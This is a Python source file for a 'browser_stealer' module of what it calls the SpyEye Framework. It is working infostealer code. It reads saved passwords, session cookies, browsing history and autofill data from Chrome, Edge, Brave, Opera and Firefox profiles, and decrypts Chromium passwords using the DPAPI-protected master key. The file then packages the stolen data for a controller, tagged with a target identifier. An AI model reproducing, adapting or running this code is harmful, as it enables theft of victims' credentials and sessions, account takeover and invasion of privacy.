"""
modules/browser_stealer.py

Advanced Browser Data Extraction Module for SpyEye Framework v3.1.
  - Extracts saved passwords, cookies, browsing history, and autofill entries from Chromium & Firefox browsers.
  - Windows Platform: Decrypts AES-256-GCM browser encryption via DPAPI / Master Keys.
  - Linux Platform: Parses profile sqlite databases securely.
  - Structured Reporting: Formats outputs into comprehensive JSON objects.
"""

import base64
import json
import logging
import os
import sqlite3
import sys
import time
from typing import Any, Dict, List, Optional

from modules.base import BaseModule

logger = logging.getLogger(__name__)


class BrowserStealerModule(BaseModule):
    """
    Extracts saved credentials, cookies, and history from installed target browsers.

    Configuration parameters:
        targets (list): Browsers to target e.g. ["chrome", "firefox", "edge", "brave", "opera"] (default: all)
        extract (list): Data types to extract: "passwords", "cookies", "history", "autofill" (default: all)
        limit (int): Maximum records per category (default: 250)
        platform (str): Operating system identifier ("windows" | "linux")
    """

    # Default profile paths for major browsers across platforms
    BROWSER_PATHS = {
        "chrome": {
            "windows": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
            "linux": os.path.expanduser("~/.config/google-chrome"),
        },
        "edge": {
            "windows": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
            "linux": os.path.expanduser("~/.config/microsoft-edge"),
        },
        "brave": {
            "windows": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
            "linux": os.path.expanduser("~/.config/BraveSoftware/Brave-Browser"),
        },
        "opera": {
            "windows": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
            "linux": os.path.expanduser("~/.config/opera"),
        },
        "firefox": {
            "windows": os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"),
            "linux": os.path.expanduser("~/.mozilla/firefox"),
        },
    }

    def __init__(self, target_id: str, config: Optional[Dict[str, Any]] = None):
        super().__init__(target_id, config)
        self._result_callback = None
        self._platform = self.config.get("platform", sys.platform)

    def validate_config(self) -> bool:
        """Validate optional configuration parameters."""
        limit = self.config.get("limit", 250)
        if isinstance(limit, int) and limit <= 0:
            logger.error("[%s] Limit parameter must be greater than zero.", self._module_name)
            return False
        return True

    def set_result_callback(self, callback) -> None:
        """Inject real-time telemetry callback function."""
        self._result_callback = callback

    def run(self) -> None:
        """Main execution thread for extracting browser data targets."""
        targets = self.config.get("targets", list(self.BROWSER_PATHS.keys()))
        extract = self.config.get("extract", ["passwords", "cookies", "history", "autofill"])
        limit = int(self.config.get("limit", 250))

        logger.info(
            "[%s] Starting extraction — targets=%s | extract=%s | limit=%d",
            self._module_name, targets, extract, limit
        )

        extracted_browsers: Dict[str, Any] = {}

        for browser in targets:
            if browser not in self.BROWSER_PATHS:
                logger.warning("[%s] Unknown browser identifier skipped: %s", self._module_name, browser)
                continue

            try:
                browser_data = self._extract_browser_data(browser, extract, limit)
                if browser_data:
                    extracted_browsers[browser] = browser_data
                    logger.info(
                        "[%s] Successfully extracted [%s] — Passwords: %d, Cookies: %d, History: %d, Autofill: %d",
                        self._module_name, browser,
                        len(browser_data.get("passwords", [])),
                        len(browser_data.get("cookies", [])),
                        len(browser_data.get("history", [])),
                        len(browser_data.get("autofill", []))
                    )
            except Exception as exc:
                logger.warning("[%s] Failed to extract data from %s: %s", self._module_name, browser, exc)

        if extracted_browsers:
            payload_summary = {
                "browsers": extracted_browsers,
                "summary": {
                    b_name: {
                        "passwords": len(b_data.get("passwords", [])),
                        "cookies": len(b_data.get("cookies", [])),
                        "history": len(b_data.get("history", [])),
                        "autofill": len(b_data.get("autofill", [])),
                    }
                    for b_name, b_data in extracted_browsers.items()
                }
            }
            self._emit_result(payload_summary)
        else:
            self._emit_error("No target browser profiles or data could be accessed.")

    def _extract_browser_data(self, browser: str, extract: List[str], limit: int) -> Dict[str, Any]:
        """Locate profiles and dispatch extraction methods for a specific browser."""
        data_packet: Dict[str, Any] = {}

        if browser == "firefox":
            profile_dir = self._find_firefox_profile()
        else:
            profile_dir = self._find_chromium_profile(browser)

        if not profile_dir or not os.path.isdir(profile_dir):
            logger.debug("[%s] Valid profile directory not found for browser: %s", self._module_name, browser)
            return {}

        if "passwords" in extract:
            data_packet["passwords"] = self._extract_passwords(browser, profile_dir, limit)
        if "cookies" in extract:
            data_packet["cookies"] = self._extract_cookies(browser, profile_dir, limit)
        if "history" in extract:
            data_packet["history"] = self._extract_history(browser, profile_dir, limit)
        if "autofill" in extract:
            data_packet["autofill"] = self._extract_autofill(browser, profile_dir, limit)

        return data_packet

    def _find_chromium_profile(self, browser: str) -> Optional[str]:
        """Locate active Chromium profile path (Default or Profile N)."""
        os_key = "linux" if not self._platform.startswith("win") else "windows"
        base_path = self.BROWSER_PATHS[browser].get(os_key)
        if not base_path or not os.path.isdir(base_path):
            return None

        for folder_name in ["Default"] + [f"Profile {i}" for i in range(12)]:
            candidate_path = os.path.join(base_path, folder_name)
            if os.path.isdir(candidate_path):
                return candidate_path
        return None

    def _find_firefox_profile(self) -> Optional[str]:
        """Locate active Firefox profile path via profiles.ini or directory scan."""
        os_key = "linux" if not self._platform.startswith("win") else "windows"
        profiles_base = self.BROWSER_PATHS["firefox"].get(os_key)
        if not profiles_base or not os.path.isdir(profiles_base):
            return None

        ini_file = os.path.join(os.path.dirname(profiles_base), "profiles.ini")
        found_profile = None

        if os.path.isfile(ini_file):
            try:
                import configparser
                cfg = configparser.ConfigParser()
                cfg.read(ini_file)
                for sec in cfg.sections():
                    if cfg[sec].get("Default", "0") == "1":
                        rel = cfg[sec].get("Path", "")
                        if rel:
                            found_profile = os.path.join(os.path.dirname(profiles_base), rel)
                            break
            except Exception:
                pass

        if not found_profile:
            for entry in os.listdir(profiles_base):
                full_entry = os.path.join(profiles_base, entry)
                if os.path.isdir(full_entry) and (".default" in entry or ".default-release" in entry):
                    found_profile = full_entry
                    break

        return found_profile if found_profile and os.path.isdir(found_profile) else None

    def _extract_passwords(self, browser: str, profile_dir: str, limit: int) -> List[Dict[str, Any]]:
        """Extract and decrypt saved login credentials."""
        passwords = []
        if browser == "firefox":
            return self._extract_firefox_passwords(profile_dir, limit)

        login_db_path = os.path.join(profile_dir, "Login Data")
        if not os.path.isfile(login_db_path):
            return passwords

        try:
            connection = sqlite3.connect(login_db_path)
            connection.text_factory = bytes
            cursor = connection.cursor()

            local_state_file = os.path.join(os.path.dirname(profile_dir), "Local State")
            master_key = self._get_chromium_master_key(local_state_file)

            cursor.execute(
                "SELECT origin_url, username_value, password_value, signon_realm FROM logins ORDER BY date_created DESC LIMIT ?",
                (limit,)
            )

            for row in cursor.fetchall():
                url = self._decode_bytes(row[0])
                username = self._decode_bytes(row[1])
                enc_pass = row[2]
                realm = self._decode_bytes(row[3]) if len(row) > 3 else ""

                decrypted_pass = self._decrypt_chromium_password(enc_pass, master_key)

                if url and username:
                    passwords.append({
                        "url": url,
                        "username": username,
                        "password": decrypted_pass or "[ENCRYPTED_BLOB]",
                        "realm": realm
                    })
            connection.close()
        except Exception as exc:
            logger.warning("[%s] Chromium password extraction error: %s", self._module_name, exc)

        return passwords

    def _extract_firefox_passwords(self, profile_dir: str, limit: int) -> List[Dict[str, Any]]:
        """Extract Firefox credentials from logins.json."""
        passwords = []
        logins_json_path = os.path.join(profile_dir, "logins.json")
        if not os.path.isfile(logins_json_path):
            return passwords

        try:
            with open(logins_json_path, "r", encoding="utf-8") as file_obj:
                content = json.load(file_obj)

            for entry in content.get("logins", [])[:limit]:
                hostname = entry.get("hostname", "")
                if hostname:
                    passwords.append({
                        "url": hostname,
                        "username": entry.get("encryptedUsername", ""),
                        "password": entry.get("encryptedPassword", ""),
                        "form_submit_url": entry.get("formSubmitURL", "")
                    })
        except Exception as exc:
            logger.warning("[%s] Firefox password extraction error: %s", self._module_name, exc)

        return passwords

    def _extract_cookies(self, browser: str, profile_dir: str, limit: int) -> List[Dict[str, Any]]:
        """Extract browser session cookies."""
        cookies = []
        cookie_db_path = os.path.join(profile_dir, "cookies.sqlite") if browser == "firefox" else os.path.join(profile_dir, "Network", "Cookies")
        if not os.path.isfile(cookie_db_path):
            return cookies

        try:
            connection = sqlite3.connect(cookie_db_path)
            connection.text_factory = bytes
            cursor = connection.cursor()

            if browser == "firefox":
                cursor.execute(
                    "SELECT host, name, value, path, expiry, isSecure FROM moz_cookies ORDER BY lastAccessed DESC LIMIT ?",
                    (limit,)
                )
            else:
                cursor.execute(
                    "SELECT host_key, name, value, path, expires_utc, is_secure FROM cookies ORDER BY last_access_utc DESC LIMIT ?",
                    (limit,)
                )

            for row in cursor.fetchall():
                cookies.append({
                    "host": self._decode_bytes(row[0]),
                    "name": self._decode_bytes(row[1]),
                    "value": self._decode_bytes(row[2]),
                    "path": self._decode_bytes(row[3]) if len(row) > 3 else "/",
                    "expires": str(row[4]) if len(row) > 4 else "",
                    "secure": bool(row[5]) if len(row) > 5 else False
                })
            connection.close()
        except Exception as exc:
            logger.warning("[%s] Cookie extraction error: %s", self._module_name, exc)

        return cookies

    def _extract_history(self, browser: str, profile_dir: str, limit: int) -> List[Dict[str, Any]]:
        """Extract browsing history logs."""
        history = []
        history_db_path = os.path.join(profile_dir, "places.sqlite") if browser == "firefox" else os.path.join(profile_dir, "History")
        if not os.path.isfile(history_db_path):
            return history

        try:
            connection = sqlite3.connect(history_db_path)
            connection.text_factory = bytes
            cursor = connection.cursor()

            if browser == "firefox":
                cursor.execute(
                    "SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT ?",
                    (limit,)
                )
            else:
                cursor.execute(
                    "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?",
                    (limit,)
                )

            for row in cursor.fetchall():
                history.append({
                    "url": self._decode_bytes(row[0]),
                    "title": self._decode_bytes(row[1]),
                    "visit_count": row[2],
                    "last_visit": str(row[3])
                })
            connection.close()
        except Exception as exc:
            logger.warning("[%s] History extraction error: %s", self._module_name, exc)

        return history

    def _extract_autofill(self, browser: str, profile_dir: str, limit: int) -> List[Dict[str, Any]]:
        """Extract saved autofill forms and credit card metadata."""
        autofill = []
        if browser != "firefox":
            web_data_path = os.path.join(profile_dir, "Web Data")
            if os.path.isfile(web_data_path):
                try:
                    connection = sqlite3.connect(web_data_path)
                    cursor = connection.cursor()
                    cursor.execute(
                        "SELECT name, value, count, date_last_used FROM autofill ORDER BY date_last_used DESC LIMIT ?",
                        (limit,)
                    )
                    for row in cursor.fetchall():
                        autofill.append({
                            "field": row[0],
                            "value": row[1],
                            "count": row[2],
                            "last_used": str(row[3])
                        })
                    connection.close()
                except Exception as exc:
                    logger.warning("[%s] Autofill extraction error: %s", self._module_name, exc)
        return autofill

    def _get_chromium_master_key(self, local_state_file: str) -> Optional[bytes]:
        """Retrieve and unprotect Chromium AES master key using DPAPI (Windows)."""
        if not os.path.isfile(local_state_file):
            return None

        try:
            with open(local_state_file, "r", encoding="utf-8") as f:
                state_data = json.load(f)

            b64_enc_key = state_data.get("os_crypt", {}).get("encrypted_key")
            if not b64_enc_key:
                return None

            raw_key = base64.b64decode(b64_enc_key)
            if raw_key.startswith(b"DPAPI"):
                raw_key = raw_key[5:]
                if self._platform.startswith("win"):
                    import win32crypt
                    return win32crypt.CryptUnprotectData(raw_key, None, None, None, 0)[1]

            return raw_key
        except Exception as exc:
            logger.warning("[%s] Master key retrieval error: %s", self._module_name, exc)
            return None

    def _decrypt_chromium_password(self, encrypted_blob: bytes, master_key: Optional[bytes]) -> Optional[str]:
        """Decrypt AES-256-GCM encrypted Chromium passwords."""
        if not encrypted_blob:
            return ""

        if not master_key and self._platform.startswith("win"):
            try:
                import win32crypt
                return win32crypt.CryptUnprotectData(encrypted_blob, None, None, None, 0)[1].decode("utf-8", errors="replace")
            except Exception:
                return None

        try:
            from Crypto.Cipher import AES
            if encrypted_blob[0] != 10: # v10 prefix check
                return None

            nonce = encrypted_blob[3:15]
            ciphertext = encrypted_blob[15:-16]
            tag = encrypted_blob[-16:]

            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted_bytes = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted_bytes.decode("utf-8", errors="replace")
        except Exception as exc:
            logger.warning("[%s] Password decryption failed: %s", self._module_name, exc)
            return None

    @staticmethod
    def _decode_bytes(val: Any) -> str:
        """Safely decode binary SQLite outputs into readable strings."""
        if isinstance(val, bytes):
            return val.decode("utf-8", errors="replace")
        return str(val) if val else ""

    def _emit_result(self, payload_data: Dict[str, Any]) -> None:
        """Dispatch extracted browser telemetry back to the controller."""
        payload = {
            "target_id": self.target_id,
            "module": "browser_stealer",
            "action": "result",
            "data": payload_data,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.info("[%s] Browser data extraction completed successfully.", self._module_name)

    def _emit_error(self, message: str) -> None:
        """Dispatch error telemetry notifications."""
        payload = {
            "target_id": self.target_id,
            "module": "browser_stealer",
            "action": "error",
            "message": message,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.error("[%s] Error: %s", self._module_name, message)